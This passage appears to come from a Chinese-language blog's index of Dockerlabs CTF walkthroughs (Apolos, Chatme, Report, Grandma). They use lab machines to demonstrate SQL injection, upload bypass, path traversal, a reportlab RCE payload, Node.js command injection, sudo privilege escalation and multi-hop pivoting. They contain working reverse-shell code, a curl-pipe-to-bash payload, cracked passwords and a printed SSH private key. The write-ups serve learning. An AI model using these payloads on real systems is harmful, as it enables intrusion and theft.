2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Apple Store\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 9.98 seconds Dirsearch #\r[root@kali] /home/kali ❯ dirsearch -u 172.17.0.2 -t 50 -i 200 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/reports/_172.17.0.2/_25-02-25_16-19-18.txt\rTarget: http://172.17.0.2/\r[16:19:18] Starting: [16:19:35] 200 - 631B - /login.php [16:19:41] 200 - 626B - /register.php [16:19:47] 200 - 405B - /uploads/ [16:19:48] 200 - 0B - /vendor/composer/autoload_static.php [16:19:48] 200 - 1KB - /vendor/composer/LICENSE [16:19:48] 200 - 520B - /vendor/ [16:19:48] 200 - 0B - /vendor/autoload.php [16:19:48] 200 - 0B - /vendor/composer/autoload_classmap.php\r[16:19:48] 200 - 0B - /vendor/composer/autoload_psr4.php [16:19:48] 200 - 0B - /vendor/composer/ClassLoader.php\r[16:19:48] 200 - 3KB - /vendor/composer/installed.json [16:19:48] 200 - 0B - /vendor/composer/autoload_namespaces.php [16:19:48] 200 - 0B - /vendor/composer/autoload_real.php Task Completed 可以看到存在uploads目录\nSQL Injection #\r进入之后随意注册一个账号，进入到mycart\n可以看到存在SQL注入漏洞\n[root@kali] /home/kali ❯ sqlmap -u \u0026#34;http://172.17.0.2/mycart.php?search=1\u0026#34; --cookie \u0026#34;PHPSESSID=uv694pbom64dihteq9e6v2s5c0\u0026#34; -p search -D apple_store -T users --dump 可以直接破解\nluisillo:mundodecaramelo\radmin:0844575632 www-data #\r使用admin的账户进入到后台\n来到Settings界面，可以上传一个文件，这里对文件名后缀有检查，使用phtml可以绕过\n访问**/uploads/shell.phtml**即可执行命令\ncmd=echo \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzEwMCAwPiYx\u0026#34; |base64 -d |bash User luisillo_o #\r这里我检查了linpeas和pspy的输出，都没有可以利用的点。\n数据库中的密码无法登录到luisillo_o，只能尝试爆破用户的密码。\n由于外部并没有开启22端口，只能内部爆破。需要使用到suForce和rockyou.txt\nd4t4s3c/suForce: Obtain a user\u0026rsquo;s system password, this tool uses the su binary to perform a brute force attack until a successful collision occurs. Root #\r发现luisillo可以查看shadow文件\n破解得到root的密码：rainbow2\nSummary #\rwww-data：比较简单的SQL注入得到后台账户密码，然后文件上传绕过php后缀名检测。\nUser：没有特殊权限的命令或者文件，也没有定时任务之类的，只能是爆破用户密码，当然这是下策。\nRoot：读取**/etc/shadow**文件进行破解。\n","date":"2025-02-25","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-apolos/","section":"Posts","summary":"","title":"Dockerlabs-Apolos","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/chatme ❯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 19:54 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000088s latency).\rNot shown: 999 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r80/tcp open http nginx 1.24.0 (Ubuntu)\r|_http-title: ChatMe - The Best Online Chat Solution\r|_http-server-header: nginx/1.24.0 (Ubuntu)\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.17.0.2 网页中存在chat.chatme.dl，将其添加到**/etc/hosts**\nGobuster #\r[root@kali] /home/kali/chatme ❯ gobuster dir -u \u0026#34;http://chat.chatme.dl/\u0026#34; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php --exclude-length 0\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://chat.chatme.dl/\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] Exclude Length: 0\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/login.php (Status: 200) [Size: 1891]\r/uploads (Status: 301) [Size: 178] [--\u0026gt; http://chat.chatme.dl/uploads/]\r/index2.php (Status: 200) [Size: 5769]\r/chat.php (Status: 200) [Size: 2]\r/upload.php (Status: 200) [Size: 147]\r/css (Status: 301) [Size: 178] [--\u0026gt; http://chat.chatme.dl/css/]\r/js (Status: 301) [Size: 178] [--\u0026gt; http://chat.chatme.dl/js/]\r/LICENSE (Status: 200) [Size: 35147]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== Upload #\r尝试上传一个木马，发现后缀名被修改为了PNG\n这里没什么思路，看了一下题解，发现**.pyz**没有被过滤，并且Whatsapp里面存在一个漏洞\nhttps://github.com/r000t1ng/Reverse-Shell-Whatsapp import socket, subprocess, os\rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\rs.connect((\u0026#34;172.17.0.1\u0026#34;, 100))\ros.dup2(s.fileno(), 0)\ros.dup2(s.fileno(), 1)\ros.dup2(s.fileno(), 2)\rp = subprocess.call([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-i\u0026#34;]) 制作pyz文件，然后监听\npython -m zipapp reverse_shell.py -o reverse_shell.pyz Root #\r查看sudo命令\n$ sudo -l\rMatching Defaults entries for system on 762518b8eb29:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\ruse_pty\rUser system may run the following commands on 762518b8eb29:\r(ALL : ALL) NOPASSWD: /usr/bin/procmail 在GTFObins中并没有收集\n但是可以创建配置文件然后指定：procmail - Unix, Linux Command\nTMPFILE=\u0026#34;/tmp/pwned2.txt\u0026#34;\r:0\r| touch $TMPFILE; chmod u+s /bin/bash 然后执行\n$ echo \u0026#34;123\u0026#34; | sudo /usr/bin/procmail -m ./config\r$ /bin/bash -p\rwhoami\rroot Summary #\rUser：卡在了文件上传的那一步，题目也没有哪里暗示了是Whatsapp，看了其他的解才知道。\nRoot：就是引用危险配置文件，写入提权的代码。\n","date":"2025-02-25","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-chatme/","section":"Posts","summary":"","title":"Dockerlabs-Chatme","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Report ❯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 18:34 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000076s latency).\rNot shown: 997 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 58:46:38:70:8c:d8:4a:89:93:07:b3:43:17:81:59:f1 (ECDSA)\r|_ 256 25:99:39:02:52:4b:80:3f:aa:a8:9a:d4:8e:9a:eb:10 (ED25519)\r80/tcp open http Apache httpd 2.4.58\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Did not follow redirect to http://realgob.dl/\r3306/tcp open mysql MySQL 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1\r| mysql-info: | Protocol: 10\r| Version: 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1\r| Thread ID: 8\r| Capabilities flags: 63486\r| Some Capabilities: LongColumnFlag, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, IgnoreSigpipes, ConnectWithDatabase, SupportsTransactions, InteractiveClient, Speaks41ProtocolNew, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments\r| Status: Autocommit\r| Salt: SMf;1\u0026amp;jb.[aWoKfBUf~i\r|_ Auth Plugin Name: mysql_native_password\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.08 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 9.89 seconds 将realgob.dl添加到**/etc/hosts**\nSQL injection #\r在noticias.php中发现存在SQL注入漏洞\n[root@kali] /home/kali/Report ❯ sqlmap -u \u0026#34;http://realgob.dl/noticias.php?id=1\u0026#34; -p id --dbs 似乎并没有什么用，其中的密码也无法破解\nDirsearch #\r[root@kali] /home/kali/Report ❯ dirsearch -u realgob.dl -t 50 -i 200\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Report/reports/_realgob.dl/_25-02-25_18-55-46.txt\rTarget: http://realgob.dl/\r[18:55:46] Starting: [18:55:48] 200 - 2KB - /about.php [18:55:49] 200 - 467B - /admin.php [18:55:52] 200 - 510B - /api/ [18:55:52] 200 - 510B - /api/v1/ [18:55:52] 200 - 500B - /api/v2/ [18:55:53] 200 - 475B - /assets/ [18:55:55] 200 - 0B - /config.php [18:55:56] 200 - 521B - /database/ [18:55:59] 200 - 452B - /images/ [18:55:59] 200 - 504B - /includes/ [18:55:59] 200 - 22KB - /info.php [18:56:00] 200 - 0B - /LICENSE [18:56:01] 200 - 1KB - /login.php [18:56:01] 200 - 475B - /logs/ [18:56:04] 200 - 0B - /pages/ [18:56:07] 200 - 0B - /README.md [18:56:12] 200 - 484B - /uploads/ Task Completed 泄露了phpinfo\nFilterChains #\r来到About页面点击Read More，发现URL中出现了一个**?file=**参数\n尝试设置为**/etc/passwd**，成功读取\n并且可以使用php://filter过滤器\n在phpinfo中发现存在Oracle，因此可以尝试使用filter-chains攻击\nSynacktiv/php_filter_chain_generator Git-dumper #\r在linpeas输出中发现存在git泄露\n[root@kali] /home/kali/Desktop ❯ git-dumper http://realgob.dl/desarrollo/.git/ ./realgob.git 在其中一个提交中得到adm的密码，注意不是hash！！\nadm:9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX Root #\radm用户并没有特殊权限的命令，也找不到其他的可利用文件。\n看了题解才知道，在adm目录的bashrc里面（这谁能知道？？？\n使用Cyberchef进行十六进制转换\n得到密码是：dockerlabs4u\nSummary #\rwww-data：从网页上来看存在SQL注入和任意文件读取，配合filterchains甚至可以执行命令，从而反弹shell。\nuser：git泄露，查看提交记录得到用户的密码。\nRoot：这个就纯属脑筋急转弯了😓。\n","date":"2025-02-25","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-report/","section":"Posts","summary":"","title":"Dockerlabs-Report","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap 10.10.10.2 #\r[root@kali] /home/kali/grandma ❯ nmap 10.10.10.2 -sV -A Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 14:29 CST\rNmap scan report for 10.10.10.2\rHost is up (0.000093s latency).\rNot shown: 997 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 f0:d4:14:46:ad:c7:15:dd:09:8d:5a:c9:4c:a0:41:86 (ECDSA)\r|_ 256 88:8f:11:21:2a:29:72:fb:60:cb:39:c7:97:05:aa:9d (ED25519)\r80/tcp open http Apache httpd 2.4.58\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Did not follow redirect to http://grandma.dl/\r5000/tcp open http aiohttp 3.9.1 (Python 3.12)\r| http-title: Hospital - Calendar\r|_Requested resource was /static/index.html\r|_http-server-header: Python/3.12 aiohttp/3.9.1\rMAC Address: 02:42:0A:0A:0A:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 10.10.10.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 14.88 seconds 将grandma.dl添加到**/etc/hosts**\n注意到在5000端口上有一个aiohttp/3.9.1的服务，可以进行目录穿越读取任意文件，在之前的文章中也涉及到过：HTB-Chemistry - HYH\nCVE-2024-23334 #\r扫描目录可以看到存在一个static目录\n[root@kali] /home/kali/grandma ❯ gobuster dir -u \u0026#34;http://10.10.10.2:5000/\u0026#34; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://10.10.10.2:5000/\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/static (Status: 403) [Size: 14]\rProgress: 220560 / 220561 (100.00%)\r===============================================================\rFinished\r============================================================== 尝试读取**/etc/passwd**成功\n[root@kali] /home/kali/grandma ❯ curl -s --path-as-is \u0026#34;http://10.10.10.2:5000/static/../../../../../etc/passwd\u0026#34; root:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\r_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\rubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\rsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\rsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\rmessagebus:x:100:101::/nonexistent:/usr/sbin/nologin\rsystemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin\rsshd:x:101:65534::/run/sshd:/usr/sbin/nologin\rdrzunder:x:1001:1001:,,,:/home/drzunder:/bin/bash 看到**/home下存在ubuntu和drzunder**两个用户\n并且可以读取到drzunder的ssh密钥\n[root@kali] /home/kali/grandma ❯ curl -s --path-as-is \u0026#34;http://10.10.10.2:5000/static/../../../../../home/drzunder/.ssh/id_rsa\u0026#34; -----BEGIN OPENSSH PRIVATE KEY-----\rb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\rNhAAAAAwEAAQAAAYEApr0W9qKwYiVTcQS+MctQUD/cICLRC8kpr8bBPi5JARDce78ZAXU4\rd4WPqFtV6SHc3A0fi6sZiLINQIeFXQKaXuUtURFs/MdUtL3FYhJuHFTZct7Wv5ER0XNTCL\rN5SQFPwxn52kaxKZ+x867dZ89lpHTRtNp9kOrauDgTT9WiDB8qayctVZyJYFKh56wFN1S/\rhF9GupgN6+pdFwxRktP5BGbvIK36gGLFwcTLnK/vgQuqsgvzioYIQpc+prgzS755eqMjNa\r+QplzimQEKYmxpOMJOzfcskZAPHtglEWmUewXE4CjGbFm8ukxtWD2Y1ou8Bjbg3JA1tEUv\rpqzlUzXlonf7FlA7zsEGM7FaHTKk0EDxYlXnUklc7UHt8hx/wNd2kTuxU/W9yibJEMPeNz\rsylWqTxozq5shkA5YCg8WSHxdpIyh9wVcffDqXJFcgAHA9Q31BZ9zcASiOszBd2TG8odb1\rkzlZ+gY5WWo7BsMZaXgO/CM3Bvy6V/XNpfcb24l/AAAFkLmzzVS5s81UAAAAB3NzaC1yc2\rEAAAGBAKa9FvaisGIlU3EEvjHLUFA/3CAi0QvJKa/GwT4uSQEQ3Hu/GQF1OHeFj6hbVekh\r3NwNH4urGYiyDUCHhV0Cml7lLVERbPzHVLS9xWISbhxU2XLe1r+REdFzUwizeUkBT8MZ+d\rpGsSmfsfOu3WfPZaR00bTafZDq2rg4E0/VogwfKmsnLVWciWBSoeesBTdUv4RfRrqYDevq\rXRcMUZLT+QRm7yCt+oBixcHEy5yv74ELqrIL84qGCEKXPqa4M0u+eXqjIzWvkKZc4pkBCm\rJsaTjCTs33LJGQDx7YJRFplHsFxOAoxmxZvLpMbVg9mNaLvAY24NyQNbRFL6as5VM15aJ3\r+xZQO87BBjOxWh0ypNBA8WJV51JJXO1B7fIcf8DXdpE7sVP1vcomyRDD3jc7MpVqk8aM6u\rbIZAOWAoPFkh8XaSMofcFXH3w6lyRXIABwPUN9QWfc3AEojrMwXdkxvKHW9ZM5WfoGOVlq\rOwbDGWl4DvwjNwb8ulf1zaX3G9uJfwAAAAMBAAEAAAGABIavf+Rsq01eFXxOeWWOeY8yN4\rEacZp1Ujsv9bMl8ix1/7nxQNPgw4XRn31TOK/doe+NQqpTWB2VNII5QYwXiqnn8AJsFfSH\rPRzFpeLgME6xVGfuJmcWt7vMrjjI+w1ZD++9k4pFtt6J4xaFFhNQLAWrx6ACtpNZepSzGY\rCwFGooKZ53oZJNPFsh3/sQbS8Uv9AiSGBmSFglTMHd2QF+CfuNVDLE0QVdXuQrrsYr1zHs\r4UZnxwPaZ4xZfAcWBWFXOY2Vv8FXm5dl+p/M2gSVvr5naczE3UvDb/PR2FHjajJxv9EuyD\rcfNY/V2aYiSvCgRRD6tD28CpR+mNRHI9hYcRvNUBob+xrIHhgEo5q5nZ74UwSG7ThUdvj9\rWetfXPEFN2HFMTTL6HO1sGfY+RjFDf5M0DXNOvutoCu7cRQRdhu8pTbkrMXOvpgPfNDMil\rzeMXaaXHgwn8qrtxmraPRPChNNVlr+oVC86DLeLCp/QbbFW67lU9etgy7iGj5GDl5xAAAA\rwQCSDLUIQh998mUqqI1d50UjwNDaUaURTH5CzA2kI30E7aPo1ptGVEZv+BrhW0MseszBOm\rw190PPu4tu7tSuWEi65W6jQ3rP3arBYg5NJY9CeqFdcbjM0+prd2w4lVW2tgmNRJV4YbMI\rM4DXJEk3cmkpSPQn+kxwDIykF4JF1OXOkqonl8cWx5kjnFt4KDTmUCGrosmTbq8vlrOT/h\rI0iqud99bVDq1bs2G5TWGit2KLS1wLySPUSBkp9fD1P4+jj7gAAADBAOe+2HazhSfiew1l\r45PaCpfj0UCwcKTA1pGTZ23ZMZEVAf+IY75hUFoFX0eiiwCfC/CEUEosoX5IB3kCOrP9zS\r3rl80QQyni5odO9FCfUrRsxQF0m0mRsXtsZeVSSCwpDJiQwOwTiGAq/jL95LKbhulkriMJ\rMt9dkTC7toDUHCKeHKgYHOQtHBaQXEJUDPhbfEoBBRmKupJOK6y/2ThO6GatSIVVfTxQ71\rfDw58e/erbHtiEvW3X5V71m2PN5HC+dwAAAMEAuDCEHRUs437tXr2ejwxujdpLceirzHw6\rdqOZyZeentgpcPgUMjqzXWSjpvwNP9jxdcmfN8/lU2lYVrJMNITA5ehHq8LoyLuzC8VwpW\rHJfy4ekNINL4ioz5ebfVw8baECKSoQpJyLSYRVkgEQQy+MxG9nggp9otf08y3Qty2Iqv9O\rW8KLOApH1hRq0dqWPv4U0jrJLLZqiZODuUDQOwto+DMdM9UK44BNLm+WMd6dQ1JjDP1yuo\rc1jN/HCLC6ayc5AAAAFWRyenVuZGVyQDhkMmU1OWQzMmJkZQECAwQF\r-----END OPENSSH PRIVATE KEY----- 拿下第一台主机权限\nChisel Proxy #\rjpillora/chisel: A fast TCP/UDP tunnel over HTTP 这里使用chisel来搭建代理，更方便一些\n启动代理成功如图\nNmap 20.20.20.3 #\r[root@kali] /home/kali/grandma ❯ proxychains nmap 20.20.20.3 -Pn -sT -p- 可以看到开放了2222和9000端口\n进入9000端口，可以看到是一个文件上传的页面\nBurp Settings #\r这里需要使用到一个插件：FoxyProxy，具体设置如下\n访问http://20.20.20.3:9000/需要调到grandma2，抓包需要调到burpsuite\n在burpsuite里需要设置一下网络连接\n发包后可以看到一个网站：http://www.reportlab.com\nCVE-2023-33733 #\r搜索查找到一个CVE漏洞\nc53elyas/CVE-2023-33733: CVE-2023-33733 reportlab RCE 得到攻击载荷\n\u0026lt;para\u0026gt;\u0026lt;font color=\u0026#34;[[[getattr(pow, Word(\u0026#39;__globals__\u0026#39;))[\u0026#39;os\u0026#39;].system(\u0026#39;touch /tmp/exploited\u0026#39;) for Word in [ orgTypeFun( \u0026#39;Word\u0026#39;, (str,), { \u0026#39;mutated\u0026#39;: 1, \u0026#39;startswith\u0026#39;: lambda self, x: 1 == 0, \u0026#39;__eq__\u0026#39;: lambda self, x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39;: lambda self: { setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1) }, \u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and \u0026#39;red\u0026#39;\u0026#34;\u0026gt;\rexploit\r\u0026lt;/font\u0026gt;\u0026lt;/para\u0026gt; 需要使用socat进行流量转发一下，我是直接把kali里面的socat传上去的\ndrzunder@e825ec493085:/tmp$ ./socat tcp-l:4444,fork,reuseaddr tcp:10.10.10.1:4444 攻击载荷应该修改为这样\n\u0026lt;para\u0026gt;\r\u0026lt;font color=\u0026#34;[ [ getattr(pow,Attacker(\u0026#39;__globals__\u0026#39;))[\u0026#39;os\u0026#39;].system(\u0026#39;curl http://20.20.20.2:8000/shell.sh | bash\u0026#39;) for Attacker in [orgTypeFun(\u0026#39;\rAttacker\u0026#39;, (str,), { \u0026#39;mutated\u0026#39;: 1, \u0026#39;startswith\u0026#39;: lambda self, x: False, \u0026#39;__eq__\u0026#39;: lambda self,x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39;: lambda self:\r{setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1)}, \u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and \u0026#39;red\u0026#39;\u0026#34;\u0026gt;\rexploit\r\u0026lt;/font\u0026gt;\r\u0026lt;/para\u0026gt; 在drzunder上面准备一个反弹shell的脚本，并且开启httpserver服务\n得到了app用户的ssh密钥\n该机器上并没有开启22端口，需要手动指定为2222\nProxy Bridge #\r如图搭建代理\n中间需要drzunder作为流量转发点\nNmap 30.30.30.3 #\rNmap scan report for 30.30.30.3\rHost is up (0.14s latency).\rNot shown: 998 closed tcp ports (conn-refused)\rPORT STATE SERVICE\r2222/tcp open EtherNetIP-1\r3000/tcp open ppp 访问3000端口返回空白\n抓包发现存在一个特殊字段\n将其解码一下\nYzMxZWNiMjItOTZiNS00MDNjLTkzMDMtMDU1ZTlmYTlhZGRi\rc31ecb22-96b5-403c-9303-055e9fa9addb 将**/etc/passwd进行BASE64加密后替换，成功读取到文件，并且存在node**用户\n成功读取到node的密钥\n同样的方式搭建代理桥，让app也作为节点，这里不再重复。\nNmap 40.40.40.3 #\r[root@kali] /home/kali/grandma ❯ proxychains nmap 40.40.40.3 -Pn -sT 2\u0026gt;/dev/null ⏎\rNmap scan report for 40.40.40.3\rHost is up (0.13s latency).\rNot shown: 999 closed tcp ports (conn-refused)\rPORT STATE SERVICE\r9999/tcp open abyss 可以看到只让POST\n[root@kali] /home/kali ❯ proxychains curl -X POST \u0026#34;http://40.40.40.3:9999/\u0026#34; [proxychains] config file found: /etc/proxychains4.conf\r[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] Dynamic chain ... 127.0.0.1:1080 ... 40.40.40.3:9999 ... OK\r{\u0026#34;message\u0026#34;:\u0026#34;POST request received\u0026#34;,\u0026#34;users\u0026#34;:[{\u0026#34;id\u0026#34;:1,\u0026#34;name\u0026#34;:\u0026#34;DrZunder\u0026#34;},{\u0026#34;id\u0026#34;:2,\u0026#34;name\u0026#34;:\u0026#34;DrMario\u0026#34;},{\u0026#34;id\u0026#34;:3,\u0026#34;name\u0026#34;:\u0026#34;App\u0026#34;},{\u0026#34;id\u0026#34;:4,\u0026#34;name\u0026#34;:\u0026#34;Node\u0026#34;},{\u0026#34;id\u0026#34;:\u0026#34;Error\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Command error\u0026#34;}]}# 这个错误消息似乎说明了，该网站对Json内容的解析有问题\n尝试发送修改后的id字段，看到命令执行的结果\n[root@kali] /home/kali ❯ proxychains curl -s -X POST \u0026#34;http://40.40.40.3:9999\u0026#34; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;id\u0026#34;: \u0026#34;require(\\\u0026#34;child_process\\\u0026#34;).execSync(\\\u0026#34;id\\\u0026#34;).toString()\u0026#34;}\u0026#39;\r[proxychains] config file found: /etc/proxychains4.conf\r[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\r[proxychains] DLL init: proxychains-ng 4.17\r[proxychains] Dynamic chain ... 127.0.0.1:1080 ... 40.40.40.3:9999 ... OK\r{\u0026#34;message\u0026#34;:\u0026#34;POST request received\u0026#34;,\u0026#34;users\u0026#34;:[{\u0026#34;id\u0026#34;:1,\u0026#34;name\u0026#34;:\u0026#34;DrZunder\u0026#34;},{\u0026#34;id\u0026#34;:2,\u0026#34;name\u0026#34;:\u0026#34;DrMario\u0026#34;},{\u0026#34;id\u0026#34;:3,\u0026#34;name\u0026#34;:\u0026#34;App\u0026#34;},{\u0026#34;id\u0026#34;:4,\u0026#34;name\u0026#34;:\u0026#34;Node\u0026#34;},{\u0026#34;id\u0026#34;:\u0026#34;Error\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Command error\u0026#34;}],\u0026#34;result\u0026#34;:\u0026#34;uid=0(root) gid=0(root) groups=0(root)\\n\u0026#34;}# 并且当前用户的root权限\n直接反弹shell就行了\nReverseShellBridges #\r反弹Shell的全部代理\n可以看到socat进行流量转发，最后把40.40.40.3的流量带到了10.10.10.1\nHttpBridges #\r下面是端口转发的全部代理，也就是访问http页面的代理\nSummary #\r终于到了Summary阶段，头都要炸了，由于不是单独的UserRoot，这里就随便说一点。\n这个靶机中有四个主机，需要逐个搭建代理。\n在本文中使用到了chisel作为代理工具，主要是因为不需要太多配置，frp的配置文件就比较繁琐。\nsocat这个工具也是第一次在多层转发的场景下使用，感觉又学到了新东西。\n对内网渗透有了更加深刻的理解！\n","date":"2025-02-24","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-grandma/","section":"Posts","summary":"","title":"Dockerlabs-Grandma","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali ❯ nmap 172.17.0.2 -sV -A Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 21:13 CST\rNmap scan report for 172.17.0.2\rHost is up (0.00011s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\r| ssh-hostkey: | 256 8c:5c:7b:fe:79:92:7a:f9:85:ec:a5:b9:27:25:db:85 (ECDSA)\r|_ 